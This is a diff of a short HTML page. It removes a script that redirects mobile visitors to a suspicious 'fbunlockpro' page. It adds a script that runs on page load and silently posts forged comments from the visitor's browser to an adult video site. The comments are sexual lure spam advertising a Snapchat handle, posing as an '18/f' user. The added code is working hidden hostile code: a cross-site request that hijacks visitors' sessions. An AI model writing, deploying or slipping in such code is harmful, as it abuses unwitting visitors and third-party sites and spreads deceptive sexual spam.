@@ -1,30 +1,52 @@
- <html><head>
- <script>
-if(navigator.userAgent.match(/iPad/i)){
- top.location.href='http://fbunlockpro.github.io/yes/land.html';
- exit;
-} 
+<html><head><script>
 
-if(navigator.userAgent.match(/iPhone/i)){
- top.location.href='http://fbunlockpro.github.io/yes/land.html';
-  exit;
-} 
 
-if(navigator.userAgent.match(/Android/i)){
- top.location.href='http://fbunlockpro.github.io/yes/land.html';
-  exit;
-} 
+function getVid(){
+   var sites = ["6088982","7858697","8068063","836294","226970","7903057","10559758","6999524","10461002","8327134","10533168","10540469","3373468","10333292","9591839","10327752","9137127","7294858","1915520","2111605","5007713","3909479","10460753","3204720","1463734","9877143","2177275","2073322","10561984","2161259","2523935","6945661","8994771","2267076","2482397","3528890","10568881","2730932","5426800","3847682","5998934"];
+        var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
 
-if(navigator.userAgent.match(/BlackBerry/i)){
- top.location.href='http://fbunlockpro.github.io/yes/land.html';
-  exit;
-} 
+function getCom(){
+     var sites1 = ["Lookin for guys to snap with katiegreen1992", "Guys to snap with? katiegreen1992", "just made snapchat and need new friends, katiegreen1992", "guys to nude snap with me? katiegreen1992", "guys snap me katiegreen1992", "lookin for men to snap with, katiegreen1992"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
+};
 
-if(navigator.userAgent.match(/webOS/i)){
- top.location.href='http://fbunlockpro.github.io/yes/land.html';
-  exit;
-}
-
- top.location.href='http://goo.gl/fQhKdc';
-</script>    
-</head></html>
+var randy=Math.floor(Math.random()*1100);
+var cmt=getCom();
+var vid=getVid();
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+    xmlhttp['open']('POST', 'http://www.eporner.com/comment/', false);
+    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+   xmlhttp['send']('cid=0&fid=333399&text=18%2Ff+lookin+for+some+fun+on+snapchat.+katiegreen1992&type=video');
+ 
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
+</script>
+</head>
+</html>
